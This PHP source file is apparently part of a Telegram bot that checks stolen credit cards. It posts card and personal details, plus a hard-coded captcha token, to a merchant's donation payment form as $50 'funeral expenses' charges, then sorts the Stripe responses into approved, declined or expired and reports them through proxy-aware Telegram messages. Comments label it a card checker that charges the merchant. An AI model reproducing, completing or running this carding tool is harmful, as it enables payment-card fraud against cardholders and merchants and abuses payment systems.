curl_setopt($ch, CURLOPT_POSTFIELDS, 'g-recaptcha-response=03ANYolqtrAXy5zIt2AjPl_v86EhHB_0O8YEgRQ73dmNp0E6rS3OaDFJqwYHwDoSLyD6Z9plsGVb3XvVAqEvqVWJTNX-YDYXAx2ynIggYNEIE5ns3byzDEIOJMghcj6qkmnzTyM4nzk3XRnSeqndz8VbvON0ctHxIbblzlqdtAwfNLKyYN3Z4QvcOqK8RmrhIJNInTgDRBAXqo8cCS3hg2xlDTbuzXSS1EV4WAlTE0yIyUVAs27f63DSS4MRZL-jX8ifTCcHmDgX3sKX92atN3k3vI91QTJ8TGmPkcuWTj4xgBnktDyFxQSIPMY2yORw5d90yIDfUHQV62ZAn3TQvZ0l_psLuVhs15xrah2ZGuA-qTBuAhAM64qn8WXaw2YCXQMG1rU4RkUeYm3PvsV0_Yxq9aBzDMC7g6aySQP-1RUw2AA6Ma7yTWvhdwL7tWcs7iy6-5fWF86dIb2tBujmSMzwfr4EdOZ1PD4Q&token='.$token.'&clientIp='.$ip.'&categoryAmount=50&paymentIterations=0&categoryName=funeral+expenses&firstName='.$name.'&lastName='.$last.'&email='.$email.'&customerEmailValidation=&phone='.$phone.'&address=true&addressStreet='.$street.'&addressApt=&addressCity='.$city.'&addressState='.$state.'&addressZipCode='.$postcode.'');
$result1 = curl_exec($ch);
curl_close($ch);
$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '',4);

$data = json_decode($result1, true);
	
//------------------------------------------------------------------//
$cvc_check = trim(strip_tags(getStr($result1,'"cvc_check":"','"')));
$decline_check = trim(strip_tags(getStr($result1,'"decline_code":"','"')));
//------------------------------------------------------------------//
if($cvc_check == false){
$proxy = "LIVE ✅";
}else{
$proxy = "PROXY DEAD ❌";
}

////////////////////////// [Card Response]  //////////////////////////
//$respo = trim(strip_tags(capture($result1,'"message":"',';')));
$respo = $data['status'] ?? trim(strip_tags(capture($result1,'"message":"',';')));
	
$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";


if (empty($respo)) {
        $respo = $response;
}


if (array_in_string($result1, $live_array)) {
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
                $live = True;
            }elseif((strpos($result1, 'The card number is incorrect.')) || (strpos($result1, 'Your card number is incorrect.')) || (strpos($result1, 'incorrect_number'))){
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: INCORRECT ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }elseif((strpos($result1, 'Your card has expired.')) || (strpos($result1, 'expired_card'))){
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: EXPIRED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }elseif((strpos($result1, 'Incomplete or incorrect payment information.'))){
		$respo = trim(strip_tags(capture($result1,'"message":"','"')));
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }elseif((strpos($result1, "Your card was declined.")) || (strpos($result1, 'The card was declined.')) || (strpos($result1, "do_not_honor")) || (strpos($result1, '"decline_code": "generic_decline"')) || (strpos($result1, "generic_decline")) || (strpos($result1, "Your card does not support this type of purchase")) || (strpos($result1, "card_error_authentication_required"))){
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
                $live = False;
            }elseif((strpos($result1, '"cvc_check": "unavailable"')) || (strpos($result1, '"cvc_check": "unchecked"')) || (strpos($result1, '"cvc_check": "fail"'))){
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: CVC CHECK UNAVAILABLE ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }elseif(strpos($result1, 'null')){
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }else{
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }
if($live) {
editMessage($chat_id, $respuesta, $id_text);
die();
} else {
editMessage($chat_id, $respuesta, $id_text);
die();
}
//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();
}



//-------------------END CHECKER CCS------------------//
//else if(isset($message)){
/*
elseif ((strpos($message, "!") === 0 && strlen($message) > 1) || (strpos($message, "/") === 0 && strlen($message) > 1) || (strpos($message, ".") === 0 && strlen($message) > 1)) {
        $respuesta = "Perdón no te entiendo!!!";
        sendMessage($chat_id,$respuesta,$message_id);
}
*/

elseif (preg_match('/^[\/!\.]\w+/', $message)) {
    // Si el mensaje comienza con /, ! o . seguido de alguna palabra
    $respuesta = "Perdón no te entiendo!!!";
    sendMessage($chat_id,$respuesta,$message_id);
   // echo "$respuesta";
} else {
    // Ignorar mensajes que no son comandos
}

//-------FUNCION DE ENVIAR---------//
function sendMessage($chatID, $respuesta, $message_id) {
$url = $GLOBALS["website"]."/sendMessage?disable_web_page_preview=true&chat_id=".$chatID."&reply_to_message_id=".$message_id."&parse_mode=HTML&text=".urlencode($respuesta);
//$url = $GLOBALS["website"]."/sendMessage?disable_web_page_preview=true&chat_id=".$chatID."&parse_mode=HTML&text=".urlencode($respuesta);
$cap_message_id = file_get_contents($url);
//------------EXTRAE EL ID DEL MENSAGE----------//
$id_cap = capture($cap_message_id, '"message_id":', ',');
file_put_contents("ID", $id_cap);
}

function sendMessageNew($chatID, $respuesta, $message_id) {
$url = $GLOBALS["website"]."/sendMessage?disable_web_page_preview=true&chat_id=".$chatID."&parse_mode=HTML&text=".urlencode($respuesta);
file_get_contents($url);
}

function sendPv($chatID, $respuesta) {
     $url = $GLOBALS["website"]."/sendMessage?chat_id=".$chatID."&text=".urlencode($respuesta);
    file_get_contents($url);                                    
}


function editMessage($chatID, $respuesta, $id_text){
$url = $GLOBALS["website"]."/editMessageText?disable_web_page_preview=true&chat_id=".$chatID."&message_id=".$id_text."&parse_mode=HTML&text=".urlencode($respuesta);
file_get_contents($url);
}


//------------------------------//

function deleteMessage($chatID, $message_id){
$url = $GLOBALS["website"]."/deleteMessage?chat_id=".$chatID."&message_id=".$message_id."";
file_get_contents($url);
}

function kickChatMember($chatID, $id){
$url = $GLOBALS["website"]."/kickChatMember?chat_id=".$chatID."&user_id=".$id."";
file_get_contents($url);
}

function unbanChatMember($chatID, $id){
$url = $GLOBALS["website"]."/unbanChatMember?chat_id=".$chatID."&user_id=".$id."";
file_get_contents($url);
}

function sendPhoto($chatID, $photoID, $description = '', $message_id = null) {                                                      $url = $GLOBALS["website"] . "/sendPhoto";

    // Inicializa cURL
    $ch = curl_init();                                          
    // Configura los datos a enviar
    $data = [
	 'chat_id' => $chatID,
        'photo' => $photoID,
        'caption' => $description,
        'parse_mode' => 'HTML',
    ];

    // Añade el ID del mensaje si se proporciona
    if ($message_id) {
        $data['reply_to_message_id'] = $message_id;
    }

    // Configura cURL para enviar una solicitud POST
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Ejecuta la solicitud
    $response = curl_exec($ch);

    // Cierra cURL
    curl_close($ch);

    return $response; // Puedes manejar la respuesta según lo necesites
 }



/*
function sendMessage($chatID, $respuesta) {
        $url = $GLOBALS["website"]."/sendMessage?chat_id=".$chatID."&parse_mode=HTML&text=".urlencode($respuesta);
        file_get_contents($url);
}
*/


?>
